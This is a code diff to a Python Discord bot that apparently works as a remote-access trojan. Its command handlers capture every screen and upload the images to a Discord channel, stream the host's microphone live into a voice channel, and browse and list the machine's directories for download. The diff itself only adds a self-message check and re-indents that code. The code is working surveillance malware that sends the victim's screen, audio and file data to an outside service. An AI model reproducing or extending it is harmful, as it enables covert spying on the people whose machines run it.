@@ -145,70 +145,70 @@ async def on_raw_reaction_remove(payload):
 @client.event
 async def on_message(message):
     global channel_ids, vc, working_directory, tree_messages
+    if message.author != client.user:
+        if message.content == '.ss':
+            await message.delete()
+            ImageGrab.grab(all_screens=True).save('ss.png')
+            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
+            os.system('del ss.png')
 
-    if message.content == '.ss':
-        await message.delete()
-        ImageGrab.grab(all_screens=True).save('ss.png')
-        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
-        os.system('del ss.png')
+        elif message.content == '.join':
+            await message.delete()
+            vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
+            vc.play(PyAudioPCM())
+            await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
 
-    elif message.content == '.join':
-        await message.delete()
-        vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
-        vc.play(PyAudioPCM())
-        await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
+        elif message.content == '.tree':
+            await message.delete()
+            if message.channel.id == channel_ids['file']:
+                tree_messages = []
 
-    elif message.content == '.tree':
-        await message.delete()
-        if message.channel.id == channel_ids['file']:
-            tree_messages = []
+                dir_path = Path('/'.join(working_directory))
+                tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
+                with open('tree.txt', 'w', encoding='utf-8') as system_tree:
+                    system_tree.write(str(dir_path) + '\n')
 
-            dir_path = Path('/'.join(working_directory))
-            tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
-            with open('tree.txt', 'w', encoding='utf-8') as system_tree:
-                system_tree.write(str(dir_path) + '\n')
+                length_limit = sys.maxsize
+                iterator = tree(Path('/'.join(working_directory)))
 
-            length_limit = sys.maxsize
-            iterator = tree(Path('/'.join(working_directory)))
-
-            tree_message_content = '```^\n'
-            for line in islice(iterator, length_limit):
-                with open('tree.txt', 'a+', encoding='utf-8') as system_tree:
-                    system_tree.write(line + '\n')
-                if len(tree_message_content) > 1800:
-                    tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
-                    tree_message_content = '```'
-                else:
-                    tree_message_content += str(line) + '\n'
-            if tree_message_content != '```':
-                tree_messages.append(await message.channel.send(tree_message_content + '```'))
-            
-            reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
-            await reaction_msg.add_reaction('📥')
-            await reaction_msg.add_reaction('🔴')
-        else:
-            reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
-
-    elif message.content[:3] == '.cd':
-        await message.delete()
-        if message.channel.id == channel_ids['file']:
-            if message.content == '.cd':
-                reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
-            else:
-                if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
-                    if message.content[4:] == '..':
-                        working_directory.pop(-1)
+                tree_message_content = '```^\n'
+                for line in islice(iterator, length_limit):
+                    with open('tree.txt', 'a+', encoding='utf-8') as system_tree:
+                        system_tree.write(line + '\n')
+                    if len(tree_message_content) > 1800:
+                        tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
+                        tree_message_content = '```'
                     else:
-                        working_directory.append(message.content[4:])
-                    reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
+                        tree_message_content += str(line) + '\n'
+                if tree_message_content != '```':
+                    tree_messages.append(await message.channel.send(tree_message_content + '```'))
+                
+                reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
+                await reaction_msg.add_reaction('📥')
+                await reaction_msg.add_reaction('🔴')
+            else:
+                reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+
+        elif message.content[:3] == '.cd':
+            await message.delete()
+            if message.channel.id == channel_ids['file']:
+                if message.content == '.cd':
+                    reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
                 else:
-                    reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')
+                    if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
+                        if message.content[4:] == '..':
+                            working_directory.pop(-1)
+                        else:
+                            working_directory.append(message.content[4:])
+                        reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
+                    else:
+                        reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')
 
-        else:
-            reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+            else:
+                reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
-    elif message.content == '.pwd':
-        reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
+        elif message.content == '.pwd':
+            reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
 
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
